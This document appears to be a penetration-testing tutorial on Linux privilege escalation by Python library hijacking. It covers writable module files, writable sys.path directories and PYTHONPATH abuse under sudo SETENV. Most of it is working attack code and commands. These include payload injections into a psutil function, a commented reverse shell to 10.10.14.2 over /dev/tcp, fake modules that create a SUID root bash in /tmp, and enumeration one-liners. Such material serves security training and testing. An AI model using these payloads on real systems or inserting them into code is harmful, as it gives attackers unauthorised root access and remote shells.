## Python Library Hijacking

Python resolves imported modules by searching a prioritised list of directories in order. If any directory higher in that list is writable, or if the module file itself is writable, you can substitute your own code and have it run under whatever privileges the calling script has. 

***

## How Python Finds Modules

```bash
# View the full import search order on the target
python3 -c 'import sys; print("\n".join(sys.path))'

# Example output (highest priority at top):
# /usr/lib/python38.zip
# /usr/lib/python3.8          <- if this is writable, anything below is hijackable
# /usr/lib/python3.8/lib-dynload
# /usr/local/lib/python3.8/dist-packages  <- where pip installs packages
# /usr/lib/python3/dist-packages

# Find where a specific module lives
pip3 show psutil | grep Location
python3 -c 'import psutil; print(psutil.__file__)'
```

***

## Attack Vector 1: Writable Module File

A module file that any user can write to is the most direct path. If the SUID/sudo script imports that module, editing the module's functions means your code runs at the script's privilege level. 

```bash
# Locate the function that is called by the script
grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*
# Result: /usr/local/lib/python3.8/dist-packages/psutil/__init__.py

# Check permissions on that file
ls -la /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
# -rw-r--rw- 1 root staff 87339 __init__.py  <- world-writable
```

Inject your payload at the very beginning of the target function. Everything above and below the injection point remains intact so the script continues to function normally after your code fires:

```python
def virtual_memory():
    #### Hijacking
    import os
    os.system('id')
    # or a reverse shell:
    # os.system('bash -i >& /dev/tcp/10.10.14.2/9001 0>&1')
    ####

    global _TOTAL_PHYMEM
    ret = _psplatform.virtual_memory()
    _TOTAL_PHYMEM = ret.total
    return ret
```

```bash
# Run the privileged script to trigger execution
sudo /usr/bin/python3 ./mem_status.py
# uid=0(root) gid=0(root) groups=0(root)
```

***

## Attack Vector 2: Writable Directory Higher in sys.path

If a directory higher in the import search order than the legitimate module's location is writable, you can create a fake module with the same name there. Python finds yours first and never reaches the real one. 

```bash
# Find the legitimate module location
pip3 show psutil | grep Location
# Location: /usr/local/lib/python3.8/dist-packages

# Check all directories higher in sys.path for write access
ls -la /usr/lib/python3.8
# drwxr-xrwx 30 root root  <- world-writable and higher priority than dist-packages
```

Create a fake module with the exact same name and matching function signature:

```python
# /usr/lib/python3.8/psutil.py
#!/usr/bin/env python3
import os

def virtual_memory():
    os.system('id')
    # Returning None here causes an AttributeError in the script
    # but the payload already fired, so that does not matter
```

```bash
# Place the file
nano /usr/lib/python3.8/psutil.py

# Trigger
sudo /usr/bin/python3 mem_status.py
# uid=0(root) gid=0(root) groups=0(root)
# AttributeError: 'NoneType' ... <- expected, code already ran
```

The function needs the correct name and the right number of parameters but does not need to return valid data. If you want the script to run silently without errors, return a stub object that satisfies the calling code. 

***

## Attack Vector 3: PYTHONPATH via SETENV

If `SETENV` appears in the sudoers entry for a Python binary, you can set `PYTHONPATH` to any directory you control when running the command. Python treats `PYTHONPATH` as the highest priority search path, above everything in `sys.path`. 

```bash
# Check for SETENV permission
sudo -l
# (ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3
# or:
# (root) SETENV: NOPASSWD: /usr/bin/python3 /opt/scripts/backup.py
```

```bash
# Step 1: Identify what module the script imports
cat /opt/scripts/backup.py | grep import
# import zipfile

# Step 2: Create a malicious module with the same name in /tmp
cat << 'EOF' > /tmp/zipfile.py
import os
def ZipFile(*args, **kwargs): pass  # stub to avoid immediate crash
os.system('cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash')
EOF

# Step 3: Run with PYTHONPATH pointing to /tmp
sudo PYTHONPATH=/tmp /usr/bin/python3 /opt/scripts/backup.py

# Step 4: Use the SUID bash copy
/tmp/rootbash -p
# uid=0(root)
```

If the sudo entry specifies the python binary only (not the script), you also get to control which script runs entirely:

```bash
# sudo -l shows: (ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3

# Drop your psutil.py in /tmp
cp psutil.py /tmp/

# Point PYTHONPATH at /tmp
sudo PYTHONPATH=/tmp /usr/bin/python3 mem_status.py
```

***

## Enumerating All Three Vectors

```bash
# Vector 1: Find world-writable module files
find /usr/lib/python* /usr/local/lib/python* -name "*.py" -writable 2>/dev/null

# Vector 2: Find writable directories in the Python path
python3 -c 'import sys; print("\n".join(sys.path))' | while read p; do
    [ -d "$p" ] && ls -ld "$p" 2>/dev/null | grep -E "^d.{8}w"
done

# Vector 3: Check for SETENV in sudoers
sudo -l | grep -i "setenv\|SETENV"

# Also check for Python scripts with SUID set
find / -name "*.py" -perm -4000 2>/dev/null

# Find what a script imports
grep "^import\|^from" /path/to/script.py
```

***

## Technique Comparison

| Vector | Condition | Entry point |
|---|---|---|
| Writable module file | Module `.py` file is world-writable | Edit function body directly |
| Writable `sys.path` dir | Higher-priority dir is writable than module install dir | Create fake module file |
| PYTHONPATH + SETENV | Sudoers has `SETENV` for python binary | Set `PYTHONPATH=/tmp`, drop fake module in `/tmp` |

A critical point across all three methods: your fake or modified function must have the exact same name and accept the same number of arguments as the original. Python will raise a `TypeError` on the call if the signatures do not match, and the payload may not fire cleanly. 
